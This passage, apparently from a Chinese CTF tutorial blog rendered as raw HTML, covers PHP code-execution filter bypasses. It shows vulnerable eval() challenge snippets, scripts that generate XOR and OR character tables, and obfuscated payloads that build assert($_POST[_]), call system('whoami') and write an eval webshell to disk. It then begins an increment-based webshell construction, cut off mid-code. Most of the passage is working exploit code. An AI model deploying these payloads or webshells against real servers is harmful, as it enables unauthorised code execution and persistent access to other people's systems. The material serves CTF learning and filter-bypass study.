href="https://www.php.net/manual/zh/function.each.php">each()</a> - 返回数组中当前的键／值对并将数组指针向前移动一步</li><li><a href="https://www.php.net/manual/zh/function.prev.php">prev()</a> - 将数组的内部指针倒回一位</li><li><a href="https://www.php.net/manual/zh/function.reset.php">reset()</a> - 将数组的内部指针指向第一个单元</li><li><a href="https://www.php.net/manual/zh/function.next.php">next()</a> - 将数组中的内部指针向前移动一位</li></ul><p>chdir():用于跳出目录，比如进入上一层目录就需要chdir(“..”)</p><p>array_reverse():翻转数组，有时候需要的元素太靠后可以用它。</p></blockquote><p>我们据此构造出payload:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">exp=print<span class="hljs-constructor">_r(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>))) <span class="hljs-comment">//打印当前目录下的文件</span><br>exp=print<span class="hljs-constructor">_r(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>))))) <span class="hljs-comment">//获取倒数第二个文件名</span><br>exp=highlight<span class="hljs-constructor">_file(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>)))))  <span class="hljs-comment">//读取文件内容</span><br></code></pre></td></tr></table></figure><h3 id="7-无字母无数字"><a href="#7-无字母无数字" class="headerlink" title="7.无字母无数字"></a>7.无字母无数字</h3><h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><p>以下面这段代码为例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]|[a-z]|\`|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="hljs-variable">$c</span>)) &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo(<span class="hljs-subst">$c</span>);&quot;</span>);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>过滤了绝大多数字符，但我们可以<strong>使用没有被过滤的字符两两异或</strong>来获取被过滤的字符。贴个羽师傅的脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">//异</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*author yu22x*/</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>  <br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br><span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br>&#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//或</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/* author yu22x */</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;or_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>  <br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br><span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)|<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br>&#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后再将需要的命令拼接出来即可。</p><p>例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">shell=<span class="hljs-variable">$_</span>=(<span class="hljs-string">&#x27;%01&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%12&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%14&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>); <span class="hljs-regexp">//</span> <span class="hljs-variable">$_</span>=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-string">&#x27;%0D&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%2F&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%0E&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>); <span class="hljs-regexp">//</span> <span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_POST&#x27;</span>;<br><span class="hljs-variable">$___</span>=$<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$_</span>(<span class="hljs-variable">$___</span>[_]); <span class="hljs-regexp">//</span> assert(<span class="hljs-variable">$_POST</span>[_]);<br></code></pre></td></tr></table></figure><p>执行env命令打印环境变量就有flag。</p><h4 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h4><p>和异或原理差不多，利用两个字符取反来获取想要的字符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//在命令行中运行</span><br><br><span class="hljs-comment">/*author yu22x*/</span><br><br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your function: &#x27;</span>);<br><br><span class="hljs-variable">$system</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN)); <br><br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your command: &#x27;</span>);<br><br><span class="hljs-variable">$command</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN)); <br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;[*] (~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$system</span>).<span class="hljs-string">&#x27;)(~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$command</span>).<span class="hljs-string">&#x27;);&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果想使用call_user_func的话可以使用下面这段取反：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~(<span class="hljs-string">&#x27;call_user_func&#x27;</span>));<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~(<span class="hljs-string">&#x27;system&#x27;</span>));<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~(<span class="hljs-string">&#x27;whoami&#x27;</span>));<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;(~&#x27;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&#x27;)(~&#x27;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&#x27;,~&#x27;</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&#x27;,\&#x27;\&#x27;)&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>一些常用的取反payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">//写马<br>//file_put_contents(&#x27;<span class="hljs-number">4</span>.php&#x27;<span class="hljs-punctuation">,</span>&#x27;&lt;?php eval(\$_POST[<span class="hljs-number">1</span>])<span class="hljs-comment">;&#x27;);</span><br>(~(<span class="hljs-variable">%99</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%A0</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%8</span>A<span class="hljs-variable">%8</span>B<span class="hljs-variable">%A0</span><span class="hljs-variable">%9</span>C<span class="hljs-variable">%90</span><span class="hljs-variable">%91</span><span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>A<span class="hljs-variable">%91</span><span class="hljs-variable">%8</span>B<span class="hljs-variable">%8</span>C))(~(<span class="hljs-variable">%CB</span><span class="hljs-variable">%D1</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>F)<span class="hljs-punctuation">,</span>~(<span class="hljs-variable">%C3</span><span class="hljs-variable">%C0</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%DF</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%93</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%DB</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%B0</span><span class="hljs-variable">%AC</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%CE</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%C4</span>))<span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br>//命令执行<br>//(call_user_func)(system<span class="hljs-punctuation">,</span>whoami<span class="hljs-punctuation">,</span>&#x27;&#x27;)<br>(~<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%93</span><span class="hljs-variable">%93</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%99</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)(~<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%86</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%92</span><span class="hljs-punctuation">,</span>~<span class="hljs-variable">%88</span><span class="hljs-variable">%97</span><span class="hljs-variable">%90</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%92</span><span class="hljs-variable">%96</span><span class="hljs-punctuation">,</span>&#x27;&#x27;)<span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><h4 id="自增-有限制"><a href="#自增-有限制" class="headerlink" title="自增(有限制)"></a>自增(有限制)</h4><p>注意是php5环境。</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>来自p牛的经典bypas，使用[]数组获取array中的第一个字符 ‘a’ ，然后通过自增去获取其它字符最终构造出webshell：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[];<br><span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;<span class="hljs-subst">$_</span>&quot;</span>; <span class="hljs-comment">// $_=&#x27;Array&#x27;;</span><br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>]; <span class="hljs-comment">// $_=$_[0];</span><br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>; <span class="hljs-comment">// A</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-comment">// S</span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-comment">// S</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// E </span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// R</span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// T</span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<br><br><span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// P</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// O</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// S</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span 